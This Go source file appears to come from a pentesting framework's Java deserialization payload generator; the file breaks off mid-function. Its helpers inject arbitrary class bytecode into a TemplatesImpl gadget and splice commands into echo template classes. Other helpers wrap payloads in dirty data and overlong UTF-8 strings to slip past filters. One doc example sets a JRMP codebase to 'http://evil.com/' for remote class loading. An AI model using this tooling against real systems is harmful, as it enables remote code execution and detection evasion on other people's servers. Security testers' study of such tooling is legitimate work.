package yso

import (
	"bufio"
	"bytes"
	"errors"
	"fmt"
	"reflect"
	"runtime"
	"strings"

	"github.com/yaklang/yaklang/common/javaclassparser"
	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
	"github.com/yaklang/yaklang/common/yserx"
)

type GadgetFunc func(cmd string) (yserx.JavaSerializable, error)
type Temper func(cmd string) string
type JavaStruct struct {
	Name        string
	Value       interface{}
	IsBytes     bool
	ClassName   string
	Type        byte
	TypeVerbose string
	Fields      []*JavaStruct
	BlockData   []*JavaStruct
}

// GetGadgetNameByFun 从函数指针获取 gadget 名称，通过解析函数名来提取。
// 函数名需要符合 "Get*JavaObject" 格式，返回中间的 * 部分作为 gadget 名称
// Example:
// ```
// name, err := GetGadgetNameByFun(GetCommonsBeanutils1JavaObject)
// // name = "CommonsBeanutils1"
// ```
func GetGadgetNameByFun(i interface{}) (string, error) {
	name := runtime.FuncForPC(reflect.ValueOf(i).Pointer()).Name()
	if strings.Contains(name, ".") {
		name = utils.GetLastElement(strings.Split(name, "."))
		if utils.MatchAllOfGlob(name, "Get*JavaObject") {
			l := len(name)
			return name[3 : l-10], nil
		}
	}
	return "", utils.Error("not found gadget name")
}

func SetJavaObjectClass(object yserx.JavaSerializable, classObject *javaclassparser.ClassObject) error {
	var tmpl *yserx.JavaObject
	WalkJavaSerializableObject(object, func(desc1 *yserx.JavaClassDesc, objSer yserx.JavaSerializable, replace func(newSer yserx.JavaSerializable)) {
		if desc1 == nil {
			return
		}
		if desc1.Detail.ClassName == "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl" {
			tmpl = objSer.(*yserx.JavaObject)
		}
	})
	if tmpl == nil {
		return utils.Error("not found TemplateImpl in java object")
	}
	err := SetTemplateObjectClass(tmpl, classObject.Bytes())
	if err != nil {
		return err
	}
	return nil
}

//func _SetJavaObjectClass(object *yserx.JavaObject, classObject *javaclassparser.ClassObject) error {
//	handleTable := map[uint64]*yserx.JavaClassDesc{}
//	tmpl, err := WalkJavaObjectAndFoundTemplate(object, handleTable)
//	if err != nil {
//		return err
//	}
//	newTmpl := CreateTemplateByClassObject(classObject)
//	if newTmpl == nil {
//		return utils.Error("create template failed")
//	}
//	*tmpl = *newTmpl
//	return nil
//}

func SetTemplateObjectClass(object *yserx.JavaObject, classBytes []byte) error {
	for _, data := range object.ClassData {
		classData, ok := data.(*yserx.JavaClassData)
		if !ok {
			continue
		}
		for _, block := range classData.Fields {
			field, ok := block.(*yserx.JavaFieldValue)
			if !ok {
				continue
			}
			if field.FieldType == 91 {
				arrObj, ok := field.Object.(*yserx.JavaArray)
				_ = arrObj
				if !ok {
					continue
				}
				//if len(arrObj.Values) != 2 {
				//	return utils.Error("template struct not match")
				//}
				//emptyClass, err := GenEmptyClassInTemplateClassObject()
				//if err != nil {
				//	return err
				//}
				arrObj.Values[0] = yserx.NewJavaFieldBytes(string(classBytes))
				//arrObj.Values[1] = yserx.NewJavaFieldBytes(string(emptyClass.Bytes()))
				return nil
			}
		}
	}
	return utils.Error("template struct not match")
}

//func WalkJavaObjectAndFoundTemplate(objSer yserx.JavaSerializable, handleTable map[uint64]*yserx.JavaClassDesc) (tmpl *yserx.JavaObject, err error) {
//	defer func() {
//		if e := recover(); e != nil {
//			err = utils.Error(e.(error).Error())
//			return
//		}
//	}()
//	var obj *yserx.JavaObject
//	switch ret := objSer.(type) {
//	case *yserx.JavaObject:
//		obj = ret
//	case *yserx.JavaArray:
//		//return WalkJavaObjectAndFoundTemplate(ret.Values[1].Object, handleTable)
//		for _, value := range ret.Values {
//			resObj, err := WalkJavaObjectAndFoundTemplate(value.Object, handleTable)
//			if err == nil {
//				return resObj, nil
//			}
//		}
//	default:
//		return nil, utils.Error("not a support type")
//	}
//	var desc *yserx.JavaClassDesc
//	var ok, ok2 bool
//	desc, ok = obj.Class.(*yserx.JavaClassDesc)
//	if !ok {
//		reference, ok1 := obj.Class.(*yserx.JavaReference)
//		if !ok1 {
//			return nil, utils.Error("cant parse desc")
//		}
//		desc, ok2 = handleTable[reference.Handle]
//		if !ok2 {
//			return nil, utils.Error("not found desc in handleTable")
//		}
//	} else {
//		handleTable[desc.Detail.Handle] = desc
//	}
//	if desc.Detail.ClassName == "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl" {
//		return obj, nil
//	}
//	if obj.Type == yserx.TC_OBJECT {
//		for _, i := range obj.ClassData {
//			classData, ok := i.(*yserx.JavaClassData)
//			if !ok {
//				continue
//			}
//			for _, b := range classData.BlockData {
//				resObj, err := WalkJavaObjectAndFoundTemplate(b, handleTable)
//				if err == nil {
//					return resObj, nil
//				}
//				//blockData, ok := b.(*yserx.JavaObject)
//				//if ok {
//				//	resObj, err := WalkJavaObjectAndFoundTemplate(blockData, handleTable)
//				//	if err == nil {
//				//		return resObj, nil
//				//	}
//				//}
//			}
//			for _, f := range classData.Fields {
//				field, ok := f.(*yserx.JavaFieldValue)
//				if ok {
//					if field.FieldType == 76 || field.FieldType == 91 {
//						//o, ok := field.Object.(*yserx.JavaObject)
//						//if !ok {
//						//	continue
//						//}
//						resObj, err := WalkJavaObjectAndFoundTemplate(field.Object, handleTable)
//						if err == nil {
//							return resObj, nil
//						}
//					}
//				}
//			}
//		}
//	} else {
//		return nil, utils.Error("not a java object")
//	}
//	return nil, utils.Error("not found template")
//}

type WalkJavaSerializableObjectHandle func(desc *yserx.JavaClassDesc, objSer yserx.JavaSerializable, replace func(newSer yserx.JavaSerializable))

func ReplaceStringInJavaSerilizable(objSer yserx.JavaSerializable, old string, new string, times int) error {
	err := utils.Error("not found string in java object")
	WalkJavaSerializableObject(objSer, func(desc *yserx.JavaClassDesc, objSer yserx.JavaSerializable, replace func(newSer yserx.JavaSerializable)) {
		o, ok := objSer.(*yserx.JavaString)
		if ok && o.Value == old && times != 0 {
			err = nil
			o.Raw = []byte(new)
			o.Value = new
			o.Size = uint64(len(new))
			times--
		} else if ok && strings.Contains(o.Value, old) && times != 0 {
			err = nil
			rep := strings.Replace(o.Value, old, new, 1)
			o.Raw = []byte(rep)
			o.Value = rep
			o.Size = uint64(len(rep))
			times--
		}
		classIns, ok := objSer.(*yserx.JavaClass)
		if ok {
			jd, ok2 := classIns.Desc.(*yserx.JavaClassDesc)
			if ok2 && jd.Detail.ClassName == old && times != 0 {
				err = nil
				jd.Detail.ClassName = new
				times--
			}
		}
	})
	return err
}

// ReplaceByteArrayInJavaSerilizable 替换Java序列化对象中的字节数组
func ReplaceByteArrayInJavaSerilizable(objSer yserx.JavaSerializable, old, new []byte, times int) error {
	err := utils.Error("not found byte array in java object")
	WalkJavaSerializableObject(objSer, func(desc *yserx.JavaClassDesc, objSer yserx.JavaSerializable, replace func(newSer yserx.JavaSerializable)) {
		// 检查是否是JavaArray对象
		javaArray, ok := objSer.(*yserx.JavaArray)
		if !ok {
			return
		}

		// 检查是否是字节数组（类名为"[B"）
		isByteArray := false
		if javaArray.ClassDesc != nil {
			switch classDesc := javaArray.ClassDesc.(type) {
			case *yserx.JavaClassDesc:
				if classDesc.Detail != nil && classDesc.Detail.ClassName == "[B" {
					isByteArray = true
				}
			case *yserx.JavaReference:
				// 对于引用类型，需要通过handleTable查找实际的类描述
				// 这里简化处理，假设Bytescode为true的数组是字节数组
				if javaArray.Bytescode {
					isByteArray = true
				}
			}
		}
		if !isByteArray || times == 0 {
			return
		}
		// 比较字节数组内容
		if javaArray.Bytescode {
			// 对于以字节形式存储的数组
			if len(javaArray.Bytes) == len(old) &&
				bytes.Equal(javaArray.Bytes, old) {
				// 替换字节数组
				javaArray.Bytes = new
				javaArray.Size = len(new)
				err = nil
				times--
			}
		} else {
			// 对于以Values形式存储的数组
			if len(javaArray.Values) == len(old) {
				match := true
				for i, value := range javaArray.Values {
					if i < len(old) && len(value.Bytes) > 0 && value.Bytes[0] != old[i] {
						match = false
						break
					}
				}

				if match {
					// 替换字节数组
					javaArray.Values = make([]*yserx.JavaFieldValue, len(new))
					for i, b := range new {
						javaArray.Values[i] = yserx.NewJavaFieldByteValue(b)
					}
					javaArray.Size = len(new)
					err = nil
					times--
				}
			}
		}
	})

	return err
}

// ReplaceClassNameInJavaSerilizable 这个 ClassName 指的是要探测的目标 jar 包里是否存在该 ClassName
func ReplaceClassNameInJavaSerilizable(objSer yserx.JavaSerializable, old string, new string, times int) error {
	err := utils.Error("not found class name in java object")
	WalkJavaSerializableObject(objSer, func(desc *yserx.JavaClassDesc, objSer yserx.JavaSerializable, replace func(newSer yserx.JavaSerializable)) {
		o, ok := objSer.(*yserx.JavaClass)
		if ok {
			jd, ok2 := o.Desc.(*yserx.JavaClassDesc)
			if ok2 && jd.Detail.ClassName == old && times != 0 {
				err = nil
				jd.Detail.ClassName = new
				times--
			}
		}
	})
	return err
}

func FindJavaSerializableClassCode(obj interface{}) []string {
	var bytesList []string
	switch concreteVal := obj.(type) {
	case map[string]interface{}:
		if bytesCode, ok := concreteVal["bytescode"].(bool); ok && bytesCode {
			if bytes, ok := concreteVal["bytes"].(string); ok {
				bytesList = append(bytesList, bytes)
			}
		}
		for _, value := range concreteVal {
			bytesList = append(bytesList, FindJavaSerializableClassCode(value)...)
		}
	case []interface{}:
		for _, item := range concreteVal {
			bytesList = append(bytesList, FindJavaSerializableClassCode(item)...)
		}
	}
	return bytesList
}

func WalkJavaSerializableObject(objSer yserx.JavaSerializable, handle WalkJavaSerializableObjectHandle) *JavaStruct {
	handleTable := map[uint64]yserx.JavaSerializable{}
	root := &JavaStruct{Name: "root"}
	structHandleTable := make(map[uint64]*JavaStruct)
	_WalkJavaSerializableObject(objSer, nil, handleTable, handle, root, structHandleTable)
	return root
}
func _WalkJavaSerializableObject(objSer yserx.JavaSerializable, replace func(newSer yserx.JavaSerializable), handleTable map[uint64]yserx.JavaSerializable, handle WalkJavaSerializableObjectHandle, node *JavaStruct, structHandleTable map[uint64]*JavaStruct) {
	if replace == nil {
		replace = func(newSer yserx.JavaSerializable) {}
	}
	defer func() {
		if e := recover(); e != nil {
			return
		}
	}()
	var getClassDescByClass func(class yserx.JavaSerializable) *yserx.JavaClassDesc
	getClassDescByClass = func(class yserx.JavaSerializable) *yserx.JavaClassDesc {
		if desc, ok := class.(*yserx.JavaClassDesc); ok {
			return desc
		}
		if ref, ok := class.(*yserx.JavaReference); ok {
			if i, ok := handleTable[ref.Handle]; ok {
				return getClassDescByClass(i)
			}
		}
		return nil
	}
	getClassDescByHandle := func(handle uint64) *yserx.JavaClassDesc {
		objClass, ok2 := handleTable[handle]
		if !ok2 {
			return nil
		}
		desc, ok := objClass.(*yserx.JavaClassDesc)
		if ok {
			return desc
		}
		return nil
	}
	var obj *yserx.JavaObject
	switch ret := objSer.(type) {
	case *yserx.JavaObject:
		obj = ret
		handleTable[ret.Handle] = ret
	case *yserx.JavaArray:
		if ret.Bytes != nil {
			node.Value = ret.Bytes
			node.IsBytes = true
		}
		v := make([]*JavaStruct, len(ret.Values))
		node.Type = ret.Type
		node.TypeVerbose = ret.TypeVerbose
		node.Value = v
		// 如果是字节数组，使用handle处理
		if ret.Values == nil && ret.Bytes != nil {
			handle(nil, ret, replace)
		}
		for i, value := range ret.Values {
			//if value.Object
			v[i] = &JavaStruct{}
			handle(nil, value, replace)
			_WalkJavaSerializableObject(value.Object, func(newSer yserx.JavaSerializable) {
				value.Object = newSer
			}, handleTable, handle, v[i], structHandleTable)
		}
		return
	case *yserx.JavaString:
		node.Type = ret.Type
		node.TypeVerbose = ret.TypeVerbose
		node.Value = ret.Value
		handle(nil, ret, replace)
		return
	case *yserx.JavaClass:
		desc, ok := ret.Desc.(*yserx.JavaClassDesc)
		if !ok {
			return
		}
		handleTable[desc.Detail.Handle] = desc
		node.Type = ret.Type
		node.TypeVerbose = ret.TypeVerbose
		node.Value = desc.Detail.ClassName + ".class"
		handle(nil, ret, replace)
		return
	case *yserx.JavaNull:
		node.Type = ret.Type
		node.TypeVerbose = ret.TypeVerbose
		node.Value = "NULL"
		return
	case *yserx.JavaReference:
		v, ok := structHandleTable[ret.Handle]
		if ok {
			node.Value = "&" + v.Name
		}

		//if i, ok := handleTable[ret.Handle]; ok {
		//	if o, ok1 := i.(*yserx.JavaObject); ok1 {
		//		desc := getClassDescByClass(o.Class)
		//		log.Infof("desc : %#v", desc)
		//		if desc != nil {
		//			name := desc.Detail.ClassName
		//			node.Value = "&" + name
		//		}
		//	}
		//}
		return
	default:
		return
	}

	var desc *yserx.JavaClassDesc
	objClass := obj.Class
	var ok bool
	desc, ok = objClass.(*yserx.JavaClassDesc)
	if !ok {
		reference, ok1 := objClass.(*yserx.JavaReference)
		if !ok1 {
			return
		} else {
			desc = getClassDescByHandle(reference.Handle)
			if desc == nil {
				return
			}
		}
	}

	node.ClassName = desc.Detail.ClassName
	node.Type = obj.Type
	node.TypeVerbose = obj.TypeVerbose
	node.Fields = []*JavaStruct{}
	node.BlockData = []*JavaStruct{}
	structHandleTable[obj.Handle] = node
	fieldIndex := 0
	p := desc
	for p != nil {
		if p.Detail.Annotations != nil {
			for _, annotation := range p.Detail.Annotations {
				_WalkJavaSerializableObject(annotation, replace, handleTable, handle, node, structHandleTable)
			}
		}
		tmpFields := []*JavaStruct{}
		handleTable[p.Detail.Handle] = p
		for _, field := range p.Detail.Fields.Fields {
			tmpFields = append(tmpFields, &JavaStruct{
				Name: field.Name,
			})
		}
		node.Fields = append(tmpFields, node.Fields...)
		if p.Detail.SuperClass == nil {
			break
		}
		superDesc, ok := p.Detail.SuperClass.(*yserx.JavaClassDesc)
		if !ok {
			reference, ok1 := p.Detail.SuperClass.(*yserx.JavaReference)
			if !ok1 {
				break
			}
			p = getClassDescByHandle(reference.Handle)
			if p == nil {
				break
			}
		} else {
			p = superDesc
		}

	}
	//if len(desc.Detail.Fields.Fields) > 0 {
	//	//fieldIndex = len(desc.Detail.Fields.Fields) - 1
	//	for _, field := range desc.Detail.Fields.Fields {
	//		node.Fields = append(node.Fields, &JavaStruct{
	//			Name: field.Name,
	//		})
	//	}
	//}
	//newNode := &JavaStruct{
	//	Fields:      []*JavaStruct{},
	//	ClassName:    desc.Detail.ClassName,
	//	Type:        obj.Type,
	//	TypeVerbose: obj.TypeVerbose,
	//}
	//node.Fields = append(node.Fields,
	//	newNode)
	//node = newNode
	handle(desc, obj, replace)
	if obj.Type == yserx.TC_OBJECT {
		for _, i := range obj.ClassData {
			classData, ok := i.(*yserx.JavaClassData)
			if !ok {
				continue
			}
			for index, b := range classData.BlockData {
				newNode := &JavaStruct{}
				node.BlockData = append(node.BlockData, newNode)
				_WalkJavaSerializableObject(b, func(newSer yserx.JavaSerializable) {
					classData.BlockData[index] = newSer
				}, handleTable, handle, newNode, structHandleTable)
				//blockData, ok := b.(*yserx.JavaObject)
				//if ok {
				//	resObj, err := WalkJavaSerializableObject(blockData, handleTable)
				//	if err == nil {
				//		return resObj, nil
				//	}
				//}
			}
			for _, f := range classData.Fields {
				fieldIndex++
				field, ok := f.(*yserx.JavaFieldValue)
				if ok {
					if field.Object != nil {
						_WalkJavaSerializableObject(field.Object, func(newSer yserx.JavaSerializable) {
							field.Object = newSer
						}, handleTable, handle, node.Fields[fieldIndex-1], structHandleTable)
					} else {
						handle(nil, field, replace)
						n := node.Fields[fieldIndex-1]
						n.Value = field.Bytes
						n.Type = field.FieldType
						n.TypeVerbose = field.FieldTypeVerbose
					}

					//if field.FieldType == 76 || field.FieldType == 91 {
					//	_WalkJavaSerializableObject(field.Object, handleTable, handle)
					//}
				}
			}

		}
	} else {
		return
	}
	return
}

// ToBcel 将 Java 类对象转换为 BCEL 编码格式的字符串
// Example:
// ```
// classObj := &javaclassparser.ClassObject{...}
// bcelStr, err := yso.ToBcel(classObj)
// ```
func ToBcel(i interface{}) (string, error) {
	switch ret := i.(type) {
	case *javaclassparser.ClassObject:
		return ret.Bcel()
	default:
		return "", utils.Errorf("cannot support %v to bcel string", reflect.TypeOf(ret))
	}
}

// ToBytes 将 Java 或反序列化对象转换为字节码
// Example:
// ```
// gadgetObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCode),yso.obfuscationClassConstantPool(),yso.evilClassName(className),yso.majorVersion(version))
// gadgetBytes,_ = yso.ToBytes(gadgetObj,yso.dirtyDataLength(10000),yso.twoBytesCharString())
// ```
func ToBytes(i interface{}, opts ...MarshalOptionFun) ([]byte, error) {
	cfg := yserx.NewMarshalContext()
	for _, opt := range opts {
		opt(cfg)
	}
	switch ret := i.(type) {
	case *javaclassparser.ClassObject:
		return ret.ToBytesByCustomStringChar(cfg.StringCharLength), nil
	case yserx.JavaSerializable:
		return yserx.MarshalJavaObjectWithConfig(ret, cfg), nil
	default:
		return nil, utils.Errorf("cannot support %v to bytes", reflect.TypeOf(ret))
	}
}

type MarshalOptionFun func(ctx *yserx.MarshalContext)

// SetToBytesDirtyDataLength 设置序列化数据中脏数据的长度
// length: 要设置的脏数据长度
// Example:
// ```
// gadgetBytes,_ = yso.ToBytes(gadgetObj,yso.dirtyDataLength(10000))
// ```
func SetToBytesDirtyDataLength(length int) MarshalOptionFun {
	return func(ctx *yserx.MarshalContext) {
		ctx.DirtyDataLength = length
	}
}

// SetToBytesJRMPMarshalerWithCodeBase 设置JRMP序列化时的CodeBase
// cb: 要设置的CodeBase字符串
// Example:
// ```
// gadgetBytes,_ = yso.ToBytes(gadgetObj,yso.SetToBytesJRMPMarshalerWithCodeBase("http://evil.com/"))
// ```
func SetToBytesJRMPMarshalerWithCodeBase(cb string) MarshalOptionFun {
	return func(ctx *yserx.MarshalContext) {
		ctx.JavaMarshaler = &yserx.JRMPMarshaler{
			CodeBase: cb,
		}
	}
}

// SetToBytesJRMPMarshaler 设置使用JRMP序列化器
// Example:
// ```
// gadgetBytes,_ = yso.ToBytes(gadgetObj,yso.SetToBytesJRMPMarshaler())
// ```
func SetToBytesJRMPMarshaler() MarshalOptionFun {
	return func(ctx *yserx.MarshalContext) {
		ctx.JavaMarshaler = &yserx.JRMPMarshaler{}
	}
}

// SetToBytesTwoBytesString 设置序列化时使用双字节字符串
// Example:
// ```
// gadgetBytes,_ = yso.ToBytes(gadgetObj,yso.twoBytesCharString())
// ```
func SetToBytesTwoBytesString() MarshalOptionFun {
	return func(ctx *yserx.MarshalContext) {
		ctx.StringCharLength = 2
	}
}

// SetToBytesThreeBytesString 设置序列化时使用三字节字符串
// Example:
// ```
// gadgetBytes,_ = yso.ToBytes(gadgetObj,yso.threeBytesCharString())
// ```
func SetToBytesThreeBytesString() MarshalOptionFun {
	return func(ctx *yserx.MarshalContext) {
		ctx.StringCharLength = 3
	}
}

// ToJson 将 Java 或反序列化对象转换为 json 字符串
// Example:
// ```
// gadgetObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCode),yso.obfuscationClassConstantPool(),yso.evilClassName(className),yso.majorVersion(version))
// gadgetJson,_ = yso.ToJson(gadgetObj)
// ```
func ToJson(i interface{}) (string, error) {
	switch ret := i.(type) {
	case *javaclassparser.ClassObject:
		return ret.Json()
	case *JavaObject:
		byteJson, err := yserx.ToJson(ret.JavaSerializable)
		if err != nil {
			return "", err
		}
		return string(byteJson), nil
	default:
		return "", utils.Errorf("cannot support %v to json string", reflect.TypeOf(ret))
	}
}

// dump 将Java 对象转换为类 Java 代码
// Example:
// ```
// gadgetObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCode),yso.obfuscationClassConstantPool(),yso.evilClassName(className),yso.majorVersion(version))
// gadgetDump,_ = yso.dump(gadgetObj)
// ```
func Dump(i interface{}) (string, error) {
	switch ret := i.(type) {
	case *javaclassparser.ClassObject:
		return ret.Dump()
	case *JavaObject:
		return JavaSerializableObjectDumper(ret)
	default:
		return "", utils.Errorf("cannot support %v to dump string", reflect.TypeOf(ret))
	}
}

func JavaSerializableObjectDumper(javaObject *JavaObject) (string, error) {
	serializableObj := javaObject.JavaSerializable

	var buf bytes.Buffer
	packets := make(map[string]struct{})
	node := WalkJavaSerializableObject(serializableObj, func(desc *yserx.JavaClassDesc, obj yserx.JavaSerializable, replace func(newSer yserx.JavaSerializable)) {

	})
	node.Name = javaObject.verbose.Name
	if err := writeJavaStructNode(&buf, packets, node, 0, false); err != nil {
		return "", err
	}
	importPackets := ""
	for packet, _ := range packets {
		importPackets += fmt.Sprintf("import %s;\n", packet)
	}
	return importPackets + "\n" + buf.String(), nil
}

func multiplyString(str string, n int) string {
	res := ""
	for i := 0; i < n; i++ {
		res += str
	}
	return res
}
func writeJavaStructNode(writer *bytes.Buffer, packets map[string]struct{}, javaStruct *JavaStruct, level int, isArrayElement bool) error {
	if javaStruct == nil {
		return nil
	}

	classNames := strings.Split(javaStruct.ClassName, ".")
	className := classNames[len(classNames)-1]

	if len(javaStruct.ClassName) > 0 {
		packets[javaStruct.ClassName] = struct{}{}
	}
	if javaStruct.Name == "" {
		if javaStruct.ClassName != "" {
			writer.WriteString(multiplyString("\t", level) + fmt.Sprintf("%s {\n", className))
			defer writer.WriteString(multiplyString("\t", level) + "}")
		}
	} else {
		writer.WriteString(multiplyString("\t", level) + fmt.Sprintf("%s = %s {\n", javaStruct.Name, className))
		defer writer.WriteString(multiplyString("\t", level) + "}\n")
	}

	if javaStruct.Value != nil {
		writer.WriteString(multiplyString("\t", level) + fmt.Sprintf("%s", javaStruct.Value))
		return nil
	}
	for _, field := range javaStruct.Fields {
		switch field.Type {
		case 90:
			booleanStr := "false"
			if v, ok := field.Value.([]uint8); ok && v[0] == 0 {
				booleanStr = "true"
			}
			writer.WriteString(fmt.Sprintf("%s%s = %v;\n", multiplyString("\t", level+1), field.Name, booleanStr))
		case 118:
			writer.WriteString(fmt.Sprintf("%s%s = %v;\n", multiplyString("\t", level+1), field.Name, field.Value))
		case 115:
			if err := writeJavaStructNode(writer, packets, field, level+1, false); err != nil {
				println(err.Error())
				return err
			}
		case 116:
			writer.WriteString(fmt.Sprintf("%s%s = \"%v\";\n", multiplyString("\t", level+1), field.Name, field.Value))
		case 117:
			JavaStructArray, ok := field.Value.([]*JavaStruct)
			if !ok {
				continue
			}
			a := multiplyString("\t", level+1) + fmt.Sprintf("%s = ", field.Name)
			writer.WriteString(a)
			writer.WriteString("[\n")
			for _, javaStruct := range JavaStructArray {
				if javaStruct.IsBytes {
					bytesCodeBytes, ok := javaStruct.Value.([]uint8)
					if !ok {
						continue
					}
					bytesCodeHex := codec.EncodeToHex(bytesCodeBytes)
					if len(bytesCodeHex) > 30 {
						bytesCodeHex = bytesCodeHex[:30] + "..."
					}
					writer.WriteString(fmt.Sprintf("%s%s,\n", multiplyString("\t", level+2), "0x"+bytesCodeHex))
					continue
				}
				if err := writeJavaStructNode(writer, packets, javaStruct, level+2, true); err != nil {
					return err
				}
				writer.WriteString(",\n")
			}
			writer.WriteString(multiplyString("\t", level+1) + "]\n")
		default:
			var value interface{}
			var err error
			switch ret := field.Value.(type) {
			case []uint8:
				if len(ret) != 4 {
					return utils.Errorf("unknown type %v", ret)
				}
				value, err = yserx.Read4ByteToInt(bufio.NewReader(bytes.NewReader(ret)))
				if err != nil {
					return err
				}
			default:
				value = ret
			}
			//writer.WriteString(fmt.Sprintf("%s%s %s = %v;\n", multiplyString("\t", level+1), field.TypeVerbose, field.Name, value))
			writer.WriteString(fmt.Sprintf("%s%s = %v;\n", multiplyString("\t", level+1), field.Name, value))
		}
	}
	return nil
}
func RepClassName(echoTmplClass []byte, oldN string, newN string) []byte {
	//查找出所有字符串的位置
	var poss []int
	start := 0
	for i := 0; i < 3; i++ {
		pos := IndexFromBytes(echoTmplClass[start:], oldN)
		if pos == -1 {
			break
		}
		poss = append(poss, pos+start)
		start += (pos + len(oldN))
	}

	Bytes2Int := func(b []byte) int {
		return int(b[0])<<8 + int(b[1])
	}

	ll := len(oldN)
	var buffer bytes.Buffer

	//分别对三种情况做替换
	pre := 0
	for _, pos := range poss {
		if string(echoTmplClass[pos-1]) == "L" {
			buffer.Write(echoTmplClass[pre : pos-3])
			buffer.Write(yserx.IntTo2Bytes(len(newN) + 2))
			buffer.Write([]byte("L" + newN))
			pre = pos + len(oldN)
		} else {
			l := Bytes2Int(echoTmplClass[pos-2 : pos])
			if l == ll+5 {
				buffer.Write(echoTmplClass[pre : pos-2])
				buffer.Write(yserx.IntTo2Bytes(len(newN) + 5))
				buffer.Write([]byte(newN))
				pre = pos + len(oldN)
				//buffer.Write(echoTmplClass[pos+len(oldN):])
			} else if l == ll {
				buffer.Write(echoTmplClass[pre : pos-2])
				buffer.Write(yserx.IntTo2Bytes(len(newN)))
				buffer.Write([]byte(newN))
				pre = pos + len(oldN)
			}
		}

	}
	buffer.Write(echoTmplClass[pre:])
	res := buffer.Bytes()
	return res
}
func RepCmd(echoTmplClass []byte, zw string, cmd string) []byte {
	pos := IndexFromBytes(echoTmplClass, zw)
	var buffer bytes.Buffer
	buffer.Write(echoTmplClass[:pos-2])
	buffer.Write(yserx.IntTo2Bytes(len(cmd)))
	buffer.Write([]byte(cmd))
	buffer.Write(echoTmplClass[pos+len(zw):])
	echoTmplClassRep := buffer.Bytes()
	return echoTmplClassRep
}

func IndexFromBytes(byt []byte, sub interface{}) int {
	return bytes.Index(byt, utils.InterfaceToBytes(sub))
}

func getMapTaskWithAllowEmpty(currentKey []string, srcMap any, key string, allow bool, cb func([]string, map[string]any) error) func() error {
	return func() error {
		if v, ok := srcMap.(map[string]any); ok {
			if v1, ok := v[key]; ok {
				if v2, ok := v1.(map[string]any); ok {
					return cb(append(currentKey, key), v2)
				}
				return utils.Errorf("config.yaml: %s is not map[string]any", strings.Join(append(currentKey, key), "."))
			}
			if allow {
				return nil
			}
			return utils.Errorf("config.yaml: %s is not found", strings.Join(append(currentKey, key), "."))
		}
		return utils.Errorf("config.yaml: %s is not map[string]any", strings.Join(currentKey, "."))
	}
}
func getStringTaskWithAllowEmpty(currentKey []string, srcMap any, key string, allow bool, cb func([]string, string) error) func() error {
	return func() error {
		if v, ok := srcMap.(map[string]any); ok {
			if v1, ok := v[key]; ok {
				switch ret := v1.(type) {
				case string:
					return cb(append(currentKey, key), ret)
				case int, int8, int16, int32, int64, uint, uint8, uint16, uint32, uint64, float32, float64:
					return cb(append(currentKey, key), fmt.Sprint(ret))
				case bool:
					if ret {
						return cb(append(currentKey, key), "true")
					}
					return cb(append(currentKey, key), "false")
				case nil:
				default:
					return utils.Errorf("config.yaml: %s is not string", strings.Join(append(currentKey, key), "."))
				}
			}
			if allow {
				return nil
			}
			return utils.Errorf("config.yaml: %s is not found", strings.Join(append(currentKey, key), "."))
		}
		return utils.Errorf("config.yaml: %s is not map[string]any", strings.Join(append(currentKey), "."))
	}
}
func getListTaskWithAllowEmpty(currentKey []string, srcMap any, key string, allow bool, cb func([]string, []any) error) func() error {
	return func() error {
		if v, ok := srcMap.(map[string]any); ok {
			if v1, ok := v[key]; ok {
				if v2, ok := v1.([]any); ok {
					return cb(append(currentKey, key), v2)
				}
				return utils.Errorf("config.yaml: %s is not []any", strings.Join(append(currentKey, key), "."))
			}
			if allow {
				return nil
			}
			return utils.Errorf("config.yaml: %s is not found", strings.Join(append(currentKey, key), "."))
		}
		return utils.Errorf("config.yaml: %s is not map[string]any", strings.Join(append(currentKey), "."))
	}
}
func getMapTask(currentKey []string, srcMap any, key string, cb func([]string, map[string]any) error) func() error {
	return getMapTaskWithAllowEmpty(currentKey, srcMap, key, false, cb)
}
func getMapOrEmptyTask(currentKey []string, srcMap any, key string, cb func([]string, map[string]any) error) func() error {
	return getMapTaskWithAllowEmpty(currentKey, srcMap, key, true, cb)
}
func getStringTask(currentKey []string, srcMap any, key string, cb func([]string, string) error) func() error {
	return getStringTaskWithAllowEmpty(currentKey, srcMap, key, false, cb)
}
func getStringOrEmptyTask(currentKey []string, srcMap any, key string, cb func([]string, string) error) func() error {
	return getStringTaskWithAllowEmpty(currentKey, srcMap, key, true, cb)
}
func getListTask(currentKey []string, srcMap any, key string, cb func([]string, []any) error) func() error {
	return getListTaskWithAllowEmpty(currentKey, srcMap, key, false, cb)
}
func getListOrEmptyTask(currentKey []string, srcMap any, key string, cb func([]string, []any) error) func() error {
	return getListTaskWithAllowEmpty(currentKey, srcMap, key, true, cb)
}
func runWorkFlow(works ...func() error) error {
	for _, work := range works {
		err := work()
		if err != nil {
			return err
		}
	}
	return nil
}

func GetJavaObjectArrayIns() (yserx.JavaSerializable, error) {
	data := "rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAA="
	byts, err := codec.DecodeBase64(data)
	if err != nil {
		return nil, err
	}
	objIns, err := yserx.ParseJavaSerialized(byts)
	if len(objIns) != 1 {
		return nil, errors.New("generate object array failed")
	}
	return objIns[0], nil
}

var dirtyDataHeader []byte
var dirtyDataHeaderByOverLongString []byte

func init() {
	bs, err := codec.DecodeBase64("rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cA==")
	if err != nil {
		log.Errorf("init dirtyDataHeader failed: %v", err)
	}
	dirtyDataHeader = bs
	bs, err = codec.DecodeBase64("rO0ABXVyACbBm8GMwarBocG2waHArsGswaHBrsGnwK7Bj8GiwarBpcGjwbTAu5DOWJ8QcylsAgAAeHA=")
	if err != nil {
		log.Errorf("init dirtyDataHeader failed: %v", err)
	}
	dirtyDataHeaderByOverLongString = bs
}

// WrapSerializeDataByDirtyData 通过脏数据包装序列化数据
// Example: wrapSerData = WrapByDirtyData(serData,1000)~
func WrapSerializeDataByDirtyData(serBytes []byte, length int) ([]byte, error) {
	buf := bytes.Buffer{}
	buf.Write(dirtyDataHeaderByOverLongString)
